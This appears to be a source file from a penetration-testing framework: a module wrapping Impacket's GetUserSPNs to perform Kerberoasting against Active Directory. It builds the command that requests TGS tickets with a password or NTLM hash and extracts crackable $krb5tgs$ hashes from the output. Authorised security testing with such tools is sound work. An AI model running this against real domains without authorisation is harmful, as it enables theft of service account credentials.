"""
Impacket GetUserSPNs Module (Kerberoasting)

Extract service principal names and request TGS tickets for cracking.
"""

from purplesploit.core.module import ExternalToolModule


class ImpacketKerberoastModule(ExternalToolModule):
    """
    Impacket GetUserSPNs - Kerberoasting attack.

    Extracts SPNs from Active Directory and requests TGS tickets
    that can be cracked offline to reveal service account passwords.
    """

    def __init__(self, framework):
        super().__init__(framework)
        self.tool_name = "impacket-GetUserSPNs"

    @property
    def name(self) -> str:
        return "Impacket Kerberoast (GetUserSPNs)"

    @property
    def description(self) -> str:
        return "Extract SPNs and request TGS tickets for offline cracking (Kerberoasting)"

    @property
    def author(self) -> str:
        return "PurpleSploit Team"

    @property
    def category(self) -> str:
        return "impacket"

    def _init_options(self):
        """Initialize module-specific options."""
        super()._init_options()

        self.options.update({
            "RHOST": {
                "value": None,
                "required": True,
                "description": "Target Domain Controller IP",
                "default": None
            },
            "USERNAME": {
                "value": None,
                "required": True,
                "description": "Domain username",
                "default": None
            },
            "PASSWORD": {
                "value": None,
                "required": False,
                "description": "Password for authentication",
                "default": None
            },
            "DOMAIN": {
                "value": None,
                "required": True,
                "description": "Domain name (e.g., CORP.LOCAL)",
                "default": None
            },
            "HASH": {
                "value": None,
                "required": False,
                "description": "NTLM hash (LM:NT format)",
                "default": None
            },
            "OUTPUT_FILE": {
                "value": None,
                "required": False,
                "description": "Output file for hashes",
                "default": None
            },
            "REQUEST": {
                "value": "true",
                "required": False,
                "description": "Request TGS tickets (-request)",
                "default": "true"
            },
            "DC_IP": {
                "value": None,
                "required": False,
                "description": "Domain Controller IP (if different from RHOST)",
                "default": None
            }
        })

    def build_command(self) -> str:
        """
        Build the impacket-GetUserSPNs command.

        Returns:
            Command string to execute
        """
        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        domain = self.get_option("DOMAIN")
        hash_val = self.get_option("HASH")
        output_file = self.get_option("OUTPUT_FILE")
        request = self.get_option("REQUEST")
        dc_ip = self.get_option("DC_IP")

        # Build target string
        if hash_val:
            target = f"{domain}/{username} -hashes {hash_val}"
        elif password:
            target = f"{domain}/{username}:{password}"
        else:
            target = f"{domain}/{username}"

        # Base command
        cmd = f"impacket-GetUserSPNs {target}"

        # DC IP
        dc = dc_ip if dc_ip else rhost
        if dc:
            cmd += f" -dc-ip {dc}"

        # Request TGS tickets
        if request and request.lower() == "true":
            cmd += " -request"

        # Output file
        if output_file:
            cmd += f" -outputfile {output_file}"

        return cmd

    def parse_output(self, output: str) -> dict:
        """
        Parse GetUserSPNs output.

        Args:
            output: Command stdout

        Returns:
            Parsed results dictionary
        """
        results = {
            "success": False,
            "spns": [],
            "tickets": [],
            "total_accounts": 0,
        }

        # Parse output
        for line in output.split('\n'):
            line = line.strip()

            # Check for SPNs
            if "ServicePrincipalName" in line:
                results["success"] = True

            # Parse SPN entries
            if line and not line.startswith('[') and "/" in line:
                parts = line.split()
                if len(parts) >= 2:
                    results["spns"].append(line)

            # Parse Kerberos tickets
            if "$krb5tgs$" in line:
                results["tickets"].append(line)
                results["total_accounts"] += 1

        return results
